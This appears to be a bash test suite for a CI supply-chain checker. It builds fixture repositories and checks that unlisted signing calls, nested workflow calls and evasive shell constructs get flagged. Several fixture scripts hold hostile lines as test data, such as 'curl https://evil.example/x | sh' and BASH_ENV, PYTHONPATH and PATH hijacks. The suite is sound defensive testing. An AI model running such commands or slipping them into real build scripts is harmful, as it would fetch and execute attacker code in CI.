d=$(mk p_exc_stale); setfile "$d" bin/tool.py '#!/usr/bin/env python3\nimport os, subprocess\nMSG = "nothing"\n'; edit_spec "$d" 'rows["bin/tool.py"]={"path":"bin/tool.py","tools":[],"signs":False,"runs":[], "env_mentions": [{"name": "PATH", "text": "cosign not found on PATH", "why": "an error message"}]}'; expect caught "AC1 script (python): an env_mentions entry whose text is not in the file is stale" tree "$d"
d=$(mk p_exc_nowhy); setfile "$d" bin/tool.py '#!/usr/bin/env python3\nimport os, subprocess\nMSG = "cosign not found on PATH"\n'; edit_spec "$d" 'rows["bin/tool.py"]={"path":"bin/tool.py","tools":[],"signs":False,"runs":[], "env_mentions": [{"name": "PATH", "text": "cosign not found on PATH", "why": ""}]}'; expect caught "AC1 script (python): an env_mentions entry without a reason" tree "$d"
d=$(mk p_exc_other); setfile "$d" bin/tool.py '#!/usr/bin/env python3\nimport os, subprocess\nMSG = "cosign not found on PATH"
os.environ["PATH"] = "x"\n'; edit_spec "$d" 'rows["bin/tool.py"]={"path":"bin/tool.py","tools":[],"signs":False,"runs":[], "env_mentions": [{"name": "PATH", "text": "cosign not found on PATH", "why": "an error message"}]}'; expect caught "AC1 script (python): an env_mentions exception covers its own text only (a second, setting mention is refused)" tree "$d"
# recorded residuals after the final-batch Sonnet check: leading redirection before a command word, $( ) inside ${...}, quote-mask order: reverted with 3bac826 (fail-open on unterminated quotes)
d=$(mk r_redir1); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\n>/dev/null awk 1\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: a leading redirection before awk (R-a)" tree "$d"
d=$(mk r_redir3); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\n<<EOF awk 1
x
EOF\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: a leading heredoc before awk" tree "$d"
d=$(mk r_redir5); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\n&>/dev/null awk 1\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: a leading &> before awk" tree "$d"
d=$(mk r_dollar1); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\necho "${X:-$(awk 1)}"\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: a \$( ) inside \${...} in double quotes (R-b)" tree "$d"
d=$(mk r_dollar3); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\necho "${X:-`awk 1`}"\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: a backtick inside \${...}" tree "$d"
d=$(mk r_quote1); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\necho "'"'"'"; setsid awk 1; echo "'"'"'"\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: a double-quoted ' then a command (R-c)" tree "$d"
d=$(mk r_quote2); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\necho '"'"'"'"'"'; setsid awk 1; echo '"'"'"'"'"'\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: a single-quoted \" then a command (R-c sibling)" tree "$d"
d=$(mk r_quote3); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\necho "a'"'"'b"; awk 1; echo '"'"'c"d'"'"'\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: mixed quotes around a command (R-c sibling)" tree "$d"
d=$(mk r_trap); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\ntrap '"'"'php -r 1'"'"' EXIT\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: php inside a trap handler string (R-g)" tree "$d"
d=$(mk r_str); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\nX='"'"'awk 1'"'"'\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: awk inside a quoted assignment (R-g)" tree "$d"
d=$(mk r_echo); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\necho "sed s/a/b/"\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: sed inside a double-quoted string (R-g)" tree "$d"
d=$(mk r_tar); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\necho tar\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: tar as an argument word (R-g)" tree "$d"
d=$(mk r_lua); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\necho lua\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: lua as an argument word (R-g)" tree "$d"
d=$(mk r_ok_sed); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\necho x | sed s/a/b/\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo","sed"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect ok "AC1 script: control: sed when the row lists it" tree "$d"
ycase y_dlp_tilde "~ in a download path (R-e)" caught <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/download-artifact@SHA
        with:
          name: dist
          path: '~/x'
      - run: bash bin/build-stage.sh a
EOF
ycase y_dlp_pct "% in a download path (R-e)" caught <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/download-artifact@SHA
        with:
          name: dist
          path: 'a%x'
      - run: bash bin/build-stage.sh a
EOF
ycase y_dlp_dollar "$ in a download path (already refused)" caught <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/download-artifact@SHA
        with:
          name: dist
          path: '$X'
      - run: bash bin/build-stage.sh a
EOF
ycase y_dlp_star "* in a download path (already)" caught <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/download-artifact@SHA
        with:
          name: dist
          path: 'a*'
      - run: bash bin/build-stage.sh a
EOF
ycase y_dlp_brace "{ in a download path (already)" caught <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/download-artifact@SHA
        with:
          name: dist
          path: 'a{b}'
      - run: bash bin/build-stage.sh a
EOF
ycase y_dlp_ok "control: a plain relative download path" ok <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/download-artifact@SHA
        with:
          name: dist
          path: 'dl/x'
      - run: bash bin/build-stage.sh a
EOF
d=$(mk u_utf8); printf 'jobs:\n  j:\n    steps:\n      - run: echo \xff\xfe\n' > "$d/.github/workflows/scan.yml"; rc=0; out=$(judge tree "$d" 2>&1) || rc=$?
if [ "$rc" = 1 ] && grep -F -q "scan.yml" <<< "$out" && ! grep -F -q Traceback <<< "$out"; then pass=$((pass + 1)); echo "ok   AC1: a workflow that is not UTF-8 is a named finding, never a traceback (R-f)"; else failn=$((failn + 1)); echo "FAIL AC1: invalid UTF-8 workflow -> rc=$rc ${out:0:240}"; fi
# listed scripts: the text scan (Sonnet blocker 2, Opus B6/B7)
S1='#!/usr/bin/env bash\nset -euo pipefail\nwitness run -- bin/build-apk.sh\n'
scriptcase s_if caught "${S1}if curl evil.example; then :; fi\n" '' "if curl (a keyword before the command, Sonnet 2)"
scriptcase s_while caught "${S1}while curl evil; do :; done\n" '' "while curl"
scriptcase s_bang caught "${S1}! curl evil\n" '' "! curl"
scriptcase s_time caught "${S1}time curl evil\n" '' "time curl"
scriptcase s_apos caught "${S1}echo \"don't\"; curl evil.example | sh; echo \"it's\"\n" '' "an apostrophe pair that blanked everything between them"
scriptcase s_trap caught "${S1}trap 'curl evil' EXIT\n" '' "trap with a quoted command"
scriptcase s_echoscript caught "${S1}echo 'curl evil' > bin/a.sh\nwitness run -- bin/a.sh\n" '' "writes a script, then runs it"
scriptcase s_pathset caught "${S1}PATH=./bin witness x\n" '' "PATH=./bin witness x"
scriptcase s_pathexp caught "${S1}export PATH=bin:\$PATH\n" '' "export PATH=bin:\$PATH"
scriptcase s_bashenv caught "${S1}export BASH_ENV=bin/evil.sh\n" '' "export BASH_ENV"
scriptcase s_pyset caught "${S1}PYTHONPATH=evil python3 x\n" '' "PYTHONPATH assignment"
scriptcase s_launch1 caught "#!/usr/bin/env bash\nset -euo pipefail\nwitness run --step build -- \"\$@\"\n" '' "witness run -- \"\$@\" lets a stage argument become the program (Opus B6)"
scriptcase s_launch2 caught "#!/usr/bin/env bash\nset -euo pipefail\nwitness run --step build -- \$1\n" '' "witness run -- \$1"
scriptcase s_launch3 caught "#!/usr/bin/env bash\nset -euo pipefail\nwitness run --step build -- \"\$(pick)\"\n" '' "witness run -- \$(pick)"
scriptcase s_launch4 caught "#!/usr/bin/env bash\nset -euo pipefail\nwitness run --step build\n" '' "witness run with no -- PATH on the line"
scriptcase s_launch5 caught "#!/usr/bin/env bash\nset -euo pipefail\nwitness run --step build -- bin/other.sh\n" 'rows["bin/other.sh"]={"path":"bin/other.sh","tools":[],"signs":False,"runs":[]}; open(d+"/bin/other.sh","w").write("#!/usr/bin/env bash\n")' "witness run -- a listed script that is not in runs"
scriptcase s_launch6 ok "#!/usr/bin/env bash\nset -euo pipefail\nwitness --log-level debug run --step build -- bin/build-apk.sh\n" '' "witness with a global flag before run, then a literal path in runs"
d=$(mk s_conf); printf '#!/usr/bin/env bash\ncurl https://evil.example/x | sh\nbash bin/evil.sh\n' > "$d/bin/stage.conf"
edit_spec "$d" 'rows["bin/stage.conf"]={"path":"bin/stage.conf","tools":[],"signs":False,"runs":[]}'; stage "$d" 'bash bin/stage.conf'
expect caught "AC1 script: a listed bin/stage.conf (no script extension) holding curl|sh is scanned and run with bash (Opus B7)" tree "$d"
d=$(mk s_shebang); printf '#!/usr/bin/bash\ncurl https://evil.example/x | sh\n' > "$d/bin/odd.sh"
edit_spec "$d" 'rows["bin/odd.sh"]={"path":"bin/odd.sh","tools":[],"signs":False,"runs":[]}'; stage "$d" 'bash bin/odd.sh'
expect caught "AC1 script: a listed script with an unrecognised shebang (#!/usr/bin/bash) is still scanned (Opus B7)" tree "$d"
d=$(mk s_nosheb); printf 'curl https://evil.example/x | sh\n' > "$d/bin/plain"
edit_spec "$d" 'rows["bin/plain"]={"path":"bin/plain","tools":[],"signs":False,"runs":[]}'; stage "$d" 'bash bin/plain'
expect caught "AC1 script: a listed file with no shebang at all is still scanned" tree "$d"
d=$(mk s_cmt); setfile "$d" bin/build-apk.sh '#!/usr/bin/env bash\n# cosign sign the thing later\nset -euo pipefail\n'; edit_spec "$d" 'pass'
expect caught "AC1 script: a signer name inside a COMMENT of a listed script that says it signs nothing is flagged (raw scan, over-reports by design)" tree "$d"
d=$(mk s_ctx); setfile "$d" bin/build-apk.sh '#!/usr/bin/env bash\necho "cosign sign --yes x"\n'; edit_spec "$d" 'pass'
expect caught "AC1 script: a signer name inside a QUOTED string of a listed script is flagged" tree "$d"

# direct signer calls in NON-stage workflows and composite actions (the grammar does not apply there, so these isolate the signer table)
d=$(mk t_prov); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest-build-provenance@%s\n' "$sha" > "$d/.github/workflows/stage-build.yml"
expect caught "AC1 another stage signs provenance with the attest action" tree "$d"
for form in '-a slsa' '-a=slsa' '-a product,slsa' '--attestations slsa' '--attestations=slsa' '--attestor slsa'; do
  d=$(mk "t_slsa_$(printf '%s' "$form" | tr -c 'a-z' _)"); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build %s -- ./bin/build.sh\n' "$form" > "$d/.github/workflows/scan.yml"
  expect caught "AC1 another stage signs provenance with Witness ($form)" tree "$d"
done
d=$(mk t_slsa_cont); printf 'jobs:\n  b:\n    steps:\n      - run: |\n          witness run --step build \\\n            -a slsa -- ./bin/build.sh\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 Witness slsa attestor on a continuation line" tree "$d"
d=$(mk t_cosprov); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest --yes --type slsaprovenance1 --predicate p.json "$IMG"\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 cosign attest of SLSA provenance in another stage" tree "$d"
d=$(mk t_comment_exempt); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest --yes --type slsaprovenance1 --predicate p.json "$IMG" # verify\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 a trailing '# verify' exempts nothing" tree "$d"
d=$(mk t_cvsign); printf 'jobs:\n  b:\n    steps:\n      - run: python3 bin/chain-verify.py sign --check --signer cosign --digests digests.json --build-record b.json --policy p.json --out provenance\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 chain-verify.py sign anywhere but stage-sign.yml is a second provenance signer" tree "$d"
d=$(mk t_sbom); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest-sbom@%s # v3\n' "$sha" > "$d/.github/workflows/scan.yml"
expect caught "AC1 actions/attest-sbom is a known signer and must be listed (not provenance, but not free)" tree "$d"
d=$(mk t_slsagen); printf 'jobs:\n  b:\n    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@%s\n' "$sha" > "$d/.github/workflows/scan.yml"
expect caught "AC1 slsa-github-generator is a provenance signer" tree "$d"
d=$(mk t_unl); printf 'jobs:\n  b:\n    steps:\n      - run: cosign sign --yes "$IMG"\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 an unlisted signing call (cosign sign) in a stage file" tree "$d"
d=$(mk t_csign); printf 'jobs:\n  b:\n    permissions: {contents: read}\n    steps:\n      - run: python3 bin/chain-verify.py sign --check --signer cosign --digests d --build-record r --policy p --out o\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 chain-verify.py sign outside stage-sign.yml is a second signer even in a job without id-token (no exemption exists)" tree "$d"
d=$(mk t_cbr); printf 'jobs:\n  b:\n    permissions: {contents: read}\n    steps:\n      - run: python3 bin/chain-verify.py check-build-record --digests d --build-record r --policy p\n' > "$d/.github/workflows/scan.yml"
expect ok "AC1 chain-verify.py check-build-record is not a signer (the dry run's hand-code attempt uses it: the same refusals, no cosign)" tree "$d"
d=$(mk t_yaml); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest --predicate p.json "$IMG"\n' > "$d/.github/workflows/other.yaml"
expect caught "AC1 a .yaml workflow file is scanned too" tree "$d"
d=$(mk t_comp); printf 'runs:\n  using: composite\n  steps:\n    - run: cosign sign "$IMG"\n      shell: bash\n' > "$d/.github/actions/x/action.yml"
expect caught "AC1 a composite action is scanned too" tree "$d"
d=$(mk t_glob); printf 'jobs:\n  b:\n    steps:\n      - run: witness --log-level debug run -a slsa -- ./bin/build.sh\n' > "$d/.github/workflows/scan.yml"
rc=0; out=$(judge tree "$d") || rc=$?          # caught for ITS reason: scan.yml's witness run signs provenance (Sonnet r7 R6: it had no fixture of its own)
if [ "$rc" != 0 ] && grep -F -q "scan.yml signs provenance (witness run" <<< "$out"; then pass=$((pass + 1)); echo "ok   AC1 a global flag before the subcommand does not hide the signer (witness --log-level debug run -a slsa) (caught: ${out:0:140})"
else failn=$((failn + 1)); echo "FAIL AC1 a global flag before the subcommand: not caught for scan.yml's witness run: rc=$rc ${out:0:300}"; fi
d=$(mk t_cflag); printf 'jobs:\n  b:\n    steps:\n      - run: cosign --verbose attest --yes --type slsaprovenance1 --predicate p.json "$IMG"\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 cosign --verbose attest of SLSA provenance" tree "$d"
d=$(mk t_aslsa); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -aslsa -- ./bin/build.sh\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 witness run -aslsa (shorthand with the value attached)" tree "$d"
d=$(mk t_wcfg); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -c witness.yaml -- ./bin/build.sh\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 witness run -c config with no explicit -a (the config file can list the slsa attestor): flagged" tree "$d"
d=$(mk t_blob); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest-blob --yes --statement prov.json --bundle b.json\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 cosign attest-blob with no literal non-provenance type is provenance (fail closed)" tree "$d"
d=$(mk t_atvar); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest --yes --type "$T" --predicate p.json "$IMG"\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 cosign attest with a shell-variable type is provenance (fail closed)" tree "$d"
d=$(mk t_quote); printf 'jobs:\n  b:\n    steps:\n      - run: echo "step #1"; cosign sign --yes "$IMG"\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 a '#' inside quotes does not hide a signer on the same line (echo \"step #1\"; cosign sign)" tree "$d"
d=$(mk t_wra); printf 'jobs:\n  b:\n    steps:\n      - uses: testifysec/witness-run-action@%s # v1\n' "$sha" > "$d/.github/workflows/scan.yml"
expect caught "AC1 testifysec/witness-run-action is a provenance signer (its attestors cannot be resolved statically)" tree "$d"
d=$(mk t_attml); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest@%s # v4\n        with:\n          subject-path: dist/x\n          predicate-type: https://slsa.dev/provenance/v1\n' "$sha" > "$d/.github/workflows/scan.yml"
expect caught "AC1 actions/attest with the SLSA predicate-type on a later line is provenance (round 5)" tree "$d"
d=$(mk t_attvar); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest@%s # v4\n        with:\n          predicate-type: ${{ inputs.t }}\n' "$sha" > "$d/.github/workflows/scan.yml"
expect caught "AC1 actions/attest with an expression predicate-type is provenance (fail closed)" tree "$d"
d=$(mk t_attok); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest@%s # v4\n        with:\n          predicate-type: https://spdx.dev/Document\n' "$sha" > "$d/.github/workflows/scan.yml"
python3 - "$d" <<'PY'
import json, sys
f = sys.argv[1] + "/.github/policy/chain-signers.json"; j = json.load(open(f))
j["signers"].append({"file": "scan.yml", "tool": "actions/attest", "reason": "SBOM attestation of the image (rule 55)"}); json.dump(j, open(f, "w"))
PY
expect ok "AC1 actions/attest with a literal non-provenance predicate-type is fine when listed with a reason" tree "$d"
d=$(mk t_wvar); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -a "$ATT" -- ./bin/build.sh\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 witness run -a \"\$ATT\" (variable attestor list) is provenance (fail closed)" tree "$d"
d=$(mk t_wexpr); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -a ${{ inputs.att }} -- ./bin/build.sh\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 witness run -a \${{ expression }} is provenance (fail closed)" tree "$d"
d=$(mk t_wfold); printf 'jobs:\n  b:\n    steps:\n      - run: >-\n          witness run --step build\n          -a slsa -- ./bin/build.sh\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 witness run with -a slsa on the next line of a folded scalar" tree "$d"
d=$(mk t_wnext); printf 'jobs:\n  b:\n    steps:\n      - run: |\n          witness run --step build -a\n          slsa -- ./bin/build.sh\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 witness run -a with its value on the next line" tree "$d"
d=$(mk t_wcfg2); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -a product -c witness.yaml -- ./bin/build.sh\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 witness run -a product -c cfg.yaml (the config file can add slsa)" tree "$d"
d=$(mk t_twotype); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest --yes --type spdx --type slsaprovenance1 --predicate p.json "$IMG"\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 cosign attest with repeated --type: the first does not hide the second" tree "$d"
d=$(mk t_blobprov); printf 'jobs:\n  b:\n    steps:\n      - run: cosign sign-blob --yes provenance.intoto.jsonl --bundle b.json\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 cosign sign-blob of a provenance blob is provenance" tree "$d"
d=$(mk t_sigpy); printf 'jobs:\n  b:\n    steps:\n      - run: python3 -m sigstore attest --predicate p.json dist/x\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 the python sigstore CLI attest is a provenance signer" tree "$d"
d=$(mk t_notation); printf 'jobs:\n  b:\n    steps:\n      - run: notation sign "$IMG"\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 notation sign is a known signer that must be listed" tree "$d"
d=$(mk t_intoto); printf 'jobs:\n  b:\n    steps:\n      - run: in-toto-run --step-name build -- ./x\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 in-toto-run is a known signer that must be listed" tree "$d"
d=$(mk t_new); cp "$good" "$d/.github/workflows/stage-extra.yml"
expect caught "AC1 a second new workflow file" tree "$d"
d=$(mk t_noreason); sed -i.bak 's/"reason":"CI patch tag (REQ-REL-009-AC5)"/"reason":" "/' "$d/.github/policy/chain-signers.json"
expect caught "AC1 a listed signer with no reason" tree "$d"
d=$(mk t_nolist); rm "$d/.github/policy/chain-signers.json"
expect caught "AC1 no chain-signers.json" tree "$d"
# 003-AC5: only release.yml calls stage-sign.yml and no stage calls a stage (a stage that calls another stage gets that stage's SAN: spike (b) case 5)
d=$(mk c_good); printf 'jobs:\n  s:\n    uses: ./.github/workflows/stage-sign.yml\n  b:\n    uses: ./.github/workflows/stage-build.yml\n' > "$d/.github/workflows/release.yml"
expect ok "003-AC5 fixture: release.yml calls every stage file" calls "$d"
d=$(mk c_nested); printf 'jobs:\n  x:\n    uses: ./.github/workflows/stage-sign.yml\n' > "$d/.github/workflows/stage-build.yml"
expect caught "003-AC5 stage-build.yml calls stage-sign.yml (nested call)" calls "$d"
d=$(mk c_second); printf 'on: push\njobs:\n  x:\n    uses: ./.github/workflows/stage-sign.yml\n' > "$d/.github/workflows/ci.yml"
expect caught "003-AC5 a second workflow (ci.yml) calls stage-sign.yml" calls "$d"
d=$(mk c_remote); printf 'jobs:\n  x:\n    uses: fosterstack/cache/.github/workflows/stage-sign.yml@%s\n' "$sha" > "$d/.github/workflows/auditor.yml"
expect caught "003-AC5 a second workflow calls stage-sign.yml by repository path and digest" calls "$d"
d=$(mk c_step); printf 'jobs:\n  x:\n    steps:\n      - uses: ./.github/workflows/stage-verify.yml\n' > "$d/.github/workflows/stage-promote.yml"
expect caught "003-AC5 a step-level reference to a stage file from another stage" calls "$d"
d=$(mk c_yaml); printf 'jobs:\n  x:\n    uses: ./.github/workflows/stage-sign.yml\n' > "$d/.github/workflows/other.yaml"
expect caught "003-AC5 a .yaml workflow calling stage-sign.yml" calls "$d"
d=$(mk c_scan); printf 'on: push\njobs:\n  x:\n    uses: ./.github/workflows/stage-build.yml\n' > "$d/.github/workflows/scan.yml"
expect ok "003-AC5 a non-stage workflow (scan.yml) may still call stage-build.yml" calls "$d"
# ---- the real repository ----------------------------------------------------------------------------------------------------------------
# Judged over a copy of the TRACKED files of .github/ and bin/ (as CI sees them), never the working directory, which suites running in
# parallel may write to (bin/__pycache__).
tracked_copy() {  # tracked_copy NAME [REPO] -> a copy of the tracked files of .github/ and bin/ of REPO (default: the real tree)
  local d="$work/tree-$1"; rm -rf "$d"; mkdir -p "$d"
  # .github/ and bin/, plus the build configuration the build tooling reads outside them (pinned in .github/policy/build-config-files.json)
  ( cd "${2:-$root}" && git ls-files -z -- .github bin .gitignore .golangci.yml .grype.yaml .ko.yaml .gremlins.yaml build .githooks ':(icase,glob)**/action.yml' ':(icase,glob)**/action.yaml' | tar --null -T - -cf - ) | tar -xf - -C "$d"; echo "$d"; }
# a tracked file deleted in the working tree would make the copy silently partial: fail clearly instead (CI checks out every tracked file)
gone=$(cd "$root" && git ls-files --deleted -- .github bin)
if [ -n "$gone" ]; then echo "FAIL tracked file(s) deleted in the working tree, the real-tree cases cannot run: $(echo $gone | head -c 300)"; exit 1; fi
REAL=$(tracked_copy real)
expect ok "the real stage-sign.yml passes the Sign judge" sign "$REAL/.github/workflows/stage-sign.yml"
expect ok "the real stage-build.yml's signing steps take nothing from a secret" build "$REAL/.github/workflows/stage-build.yml"
expect ok "the real tree: only release.yml calls stage-sign.yml and no stage calls a stage (003-AC5; green already: scan.yml and main-candidate-rescan.yml are non-stage callers)" calls "$REAL"
# FROZEN LEGACY FILES (REQ-CHAIN-003 notes): the eleven legacy stage files PRs 2-4 rewrite on chain-v030 are listed with the sha256 of their
# bytes in .github/policy/legacy-stage-files.json; the tree judge leaves out the findings OF a listed file whose bytes match (it still reads
# them to see which scripts they run), and judges everything else in full. So the real tree is an ordinary `expect ok`. A file whose bytes
# differ is judged in full; when the last legacy file is rewritten, deleting the list leaves this same case judging the whole tree.
expect ok "the real tree: only stage-sign.yml is new and only it signs provenance (the eleven frozen legacy stage files left out by sha256)" tree "$REAL"
# every probe is a copy of the real tree with ONE change; the tree judge must fail it and name the changed file
SIGN_JOB='  extra-attest:\n    runs-on: ubuntu-24.04\n    permissions:\n      id-token: write\n      attestations: write\n    steps:\n      - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.0.0\n        with:\n          subject-path: x\n'
probe() {  # probe NAME TEXT-THE-FINDINGS-MUST-NAME LABEL EDIT(shell, run in the copy)
  local d out rc=0; d=$(tracked_copy "probe-$1")
  ( cd "$d" && eval "$4" ) || echo "probe $1: the edit did not apply"
  out=$(judge tree "$d") || rc=$?
  if [ "$rc" != 0 ] && grep -F -q -- "$2" <<< "$out"; then pass=$((pass + 1)); echo "ok   real-tree probe: $3 is caught (${out:0:140})"
  else failn=$((failn + 1)); echo "FAIL real-tree probe let through $3 (or did not name $2): rc=$rc ${out:0:300}"; fi; }
rehash() {  # rehash PATH: refresh PATH's sha256 in chain-scripts.json of the copy (the probe edits a listed script "properly")
  python3 -c 'import hashlib,json,sys; p=".github/policy/chain-scripts.json"; d=json.load(open(p))
for r in d["scripts"]:
    if r["path"] == sys.argv[1]: r["sha256"] = hashlib.sha256(open(sys.argv[1],"rb").read()).hexdigest(); r.update(dict(a.split("=",1) for a in sys.argv[2:]))
json.dump(d, open(p,"w"), indent=1)' "$@"; }
probe build    stage-build.yml      "a second provenance signer job in stage-build.yml"     "printf '$SIGN_JOB' >> .github/workflows/stage-build.yml"
probe image    stage-image.yml      "a second provenance signer job in stage-image.yml"     "printf '$SIGN_JOB' >> .github/workflows/stage-image.yml"
probe sneak    stage-admission.yml  "stage-admission.yml running an unlisted bin/sneak.sh that signs provenance" \
  "printf '#!/usr/bin/env bash\ncosign attest --type slsaprovenance --predicate p.json img\n' > bin/sneak.sh; printf '  sneak:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: bash bin/sneak.sh\n' >> .github/workflows/stage-admission.yml"
probe supply   supply-chain.yml     "a provenance signer job in supply-chain.yml"           "printf '$SIGN_JOB' >> .github/workflows/supply-chain.yml"
probe ci       ci.yml               "a provenance signer job in ci.yml"                     "printf '$SIGN_JOB' >> .github/workflows/ci.yml"
# KR-SIGN-1 (cache4, handoff 0475): bin/release-sign.sh runs bin/vendor-provenance.py, so the inventory must list it with its bytes; dropping the row, or changing the script without its hash, turns the judge red
probe vendorrow vendor-provenance.py "dropping the bin/vendor-provenance.py row from chain-scripts.json" \
  "python3 -c 'import json; p=\".github/policy/chain-scripts.json\"; d=json.load(open(p)); d[\"scripts\"]=[r for r in d[\"scripts\"] if r[\"path\"]!=\"bin/vendor-provenance.py\"]; json.dump(d, open(p,\"w\"), indent=1)'"
probe vendorbytes vendor-provenance.py "an edit of bin/vendor-provenance.py without its sha256 in the row" "printf '\n# edited\n' >> bin/vendor-provenance.py"
